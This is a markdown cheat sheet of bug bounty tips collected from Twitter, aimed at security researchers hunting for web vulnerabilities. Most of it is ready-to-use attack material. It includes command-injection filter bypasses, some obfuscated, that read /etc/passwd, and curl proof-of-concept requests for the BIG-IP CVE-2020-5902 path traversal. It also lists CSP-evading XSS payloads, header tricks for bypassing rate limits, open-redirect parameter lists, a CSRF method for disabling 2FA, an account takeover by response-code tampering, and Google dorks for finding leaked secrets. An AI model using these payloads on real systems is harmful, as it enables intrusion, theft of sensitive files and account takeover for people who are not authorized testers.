# Bug Bounty Tips 

- This is a collection of useful tips and tricks for bug bounty hunters collected from Twitter #BugBountyTip #BugBountyTips

***

## SMTP server takeover
```
1. Visit target.com
2. Masscan on target.com
3. Get SMTP(25) port open
4. Run netcat
    nc -v <ip><port>
```

**Observations:**
* The only exploitable thing is if the SMTP server allows unauthenticated emails being sent, as that an attacker could use the company SMTP server to send spam/junk mails. and probably will be a P3 or P4, or a nice informative because its a grey area bug.

***

## 25 Open Redirect Dorks 

```javascript
/{payload}
?next={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={pay load}
?return_path={payload}
```


***

## Bypassing 2FA with CSRF (abusing the 2FA functionality)

> 1) Create 2 accounts on target.com
> 2) Turn on 2FA in both accounts
> 3) Click on disable 2FA for any of the account and capture it in burp
> 4) Close the tab for first account and stay loggend in on 2nd account
> 5) Simply submit the CSRF PoC in a new tab
> 6) See if the 2FA is disabled in the 2nd account

***

## Bypassing Rate Limit on Header

```http
Add header/s with request:

X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```
**Observations:**
* This only works, if the load balancer does not discard these headers before passing the request. Whenver they do not discard them but rely on them it is a security mistake. Also try like local addresses such as 127.0.0.1 to see if it yields extra data in the response

***

## SSRF using assetfinder & waybackurls
* Find API links in subdomains
```bash
assetfinder --subs-only http://target.com | waybackurls | grep "?url="
```
Tools from @tomnomnom
* [assetfinder](https://github.com/tomnomnom/assetfinder)
* [waybackurls](https://github.com/tomnomnom/waybackurls)

***

## Comand Injection - Filter Bypass

```console
cat /etc/passwd
cat /e"t"c/pa"s"swd
cat /'e'tc/pa's' swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et' 'c/passw' 'd
cat /et$()c/pa$()$swd
cat /et${neko}c/pas${poi} swd
{cat,/etc/passwd} 
*echo "dwssap/cte/ tac" | rev
$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d)
w\ho\am\i
/\b\i\n/////s\h
who$@ami
xyz%0Acat%20/etc/passwd
IFS=,;`cat<<<uname,-a`
/???/??t /???/p??s??
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```
***

## Finding Google Maps API Key

>1. Find the page on http://target.com where the google map is embedded .
>2. View page source.
>3. Got google map key.
>4. Use https://github.com/ozguralp/gmapsapiscanner to exploit.

**Observations:**
* Another tools to find secrets (api keys, access tokens, JWT etc):
    - [SecretFinder](https://github.com/m4ll0k/SecretFinder)
    - [JSParser](https://github.com/nahamsec/JSParser)

***

## BIGIP CVE-2020-5902 PoC
*CVE-2020-5902 allows for unauthenticated attackers  execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code.  [[+]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902)*

```console
https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```

```console
https://{host}/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
```

```console
https://{host}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa
```

```console
https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
```

```console
https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
```

* **Manuel POC**:
```console
curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
```

```console
curl -sk 'https://{IP}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
```

* **Nuclei Detect CVE-2020-5902**
https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/CVE-2020-5902.yaml

```console
nuclei -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -l https.txt
```
![image](https://i.ibb.co/hHsWjrk/4.png)

![image](https://i.ibb.co/fNm0JGL/2.png)

* **NMAP Script for CVE-2020-5902**

```console
wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
```

```console
nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
```

![image](https://i.ibb.co/S0df0bk/5.png)

***

## Basic XSS Payloads

* If you control the name, will work on Firefox in any context, will fail in chromium in DOM 

```html
<svg/onload=eval(name)>
```

* If you control the URL, Safari-only
```html
<iframe/onload=write(URL)>
```

* If you control the URL 
```html
<svg/onload=eval(`'`+URL)>
```

* If you controll the name, but unsafe-eval not enabled
```html
<svg/onload=location=name>
```

* Just a casual script
```html
<script/src=//??.???></script>
```

* If you control the name of the window
```html
<iframe/onload=src=top.name>
```

* If you control the URL
```html
<iframe/onload=eval('`'+URL)>
```

* If number of iframes on the page is constant
```html
<iframe/onload=src=top[0].name+/\??.????/>
```

* for Firefox only
```html
<iframe/srcdoc="<svg><script/href=//??.??? />">
```

* If number of iframes on the page is random
```html
<iframe/onload=src=contentWindow.name+/\??.????/>
```

* If unsafe-inline is disabled in CSP and external scripts allowed 
```html
<iframe/srcdoc="<script/src=//??.???></script>">
```

* If inline styles are allowed 
```html
<style/onload=eval(name)>
```

* If inline styles are allowed, Safari only
```html
<style/onload=write(URL)>
```

* If inline styles are allowed and the URL can be controlled
```html
<style/onload=eval(`'`+URL)>
```

* If inline styles are blocked
```html
<style/onerror=eval(name)>
```
***

## XSS Email User Input 
* The email: test@test.com is being reflected
* But its required "@" in the email field
* Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
* **The Payload tested in this case:**

```html
???<svg/onload=alert(1)>???@x.y 
```

* [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)

***

## XSS payload with Alert Obfuscation, for bypass RegEx filters

```html
<img src="X" onerror=top[8680439..toString(30)](1337)>
```
## More XSS Payloads

```html
#><img src=x onerror=alert()>.jpg
```
```html
">'><details/open/ontoggle=confirm(1337)>
```

***

## Method #1 to find XSS
```console
amass enum -passive -norecursive -noalts -d domain .com -o domain.txt

cat domain.txt | httpx -o domainhttpx.txt

cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
```
Tools:
- [amass](https://github.com/OWASP/Amass)
- [httpx](https://github.com/projectdiscovery/httpx)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)

***

## Method #2 to find XSS

1) [Wayback](https://github.com/tomnomnom/waybackurls) to get all URLs
2) Filtered only URLS with parameter and store it in a file
3) [KXSS](https://github.com/tomnomnom/hacks/tree/master/kxss)

***

## Finding secrets using simple Google Dork

```
site:http://codepad.co "company"
site:http://scribd.com "company"
site:http://npmjs.com "company"
site:http://npm.runkit.com "company"
site:http://libraries.io "company"
site:http://ycombinator.com "company"
site:http://coggle.it "company"
site:http://papaly.com "company"
site:http://google.com "company"
site:http://trello.com "company"
site:http://prezi.com "company"
site:http://jsdelivr.net "company"
site:http://codepen.io "company"
site:http://codeshare.io "company"
site:http://sharecode.io "company"
site:http://pastebin.com "company"
site:http://repl.it "company"
site:http://productforums.google.com "company"
site:http://gitter.im "company"
site:http://bitbucket.org "company"
site:*.atlassian.net "company"
atlassian.net "company"
inurl:gitlab "company"
```
- [Google dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks)

***

## Account Takeover - security question input

```
1. Request user password reset
2. Enter any invalid security question answer
    - Invalid answer => statusCode:2011
3. Change response code to statusCode:2010
4. Password change page appears and any account can be taken over
```
***

## Open Redirect params

```
/[redirect]
?targetOrigin=[redirect]
?fallback=[redirect]
?query=[redirect]
?redirection_url=[redirect]
?next=[redirect]
?ref_url=[redirect]
?state=[redirect]
?l=[redirect]
?redirect_uri=[redirect]
?forum_reg=[redirect]
?return_to=[redirect]
?redirect_url=[redirect]
?return_url=[redirect]
?host=[redirect]
?url=[redirect]
?redirectto=[redirect]
?return=[redirect]
?prejoin_data=[redirect]
?callback_url=[redirect]
?path=[redirect]
?authorize_callback=[redirect]
?email=[redirect]
?origin=[redirect]
?continue=[redirect]
?domain_name=[redirect]
?redir=[redirect]
?wp_http_referer=[redirect]
?endpoint=[redirect]
?shop=[redirect]
?qpt_question_url=[redirect]
?checkout_url=[redirect]
?ref_url=[redirect]
?redirect_to=[redirect]
?succUrl=[redirect]
?file=[redirect]
?link=[redirect]
?referrer=[redirect]
?recipient=[redirect]
?redirect=[redirect]
?u=[redirect]
?hostname=[redirect]
?returnTo=[redirect]
?return_path=[redirect]
?image=[redirect]
?requestTokenAndRedirect=[redirect]
?retURL=[redirect]
?next_url=[redirect]
```

***

### Other useful resources:
* [Curated list of Bug Bounty Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups)
* [Resources for Beginners](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters)
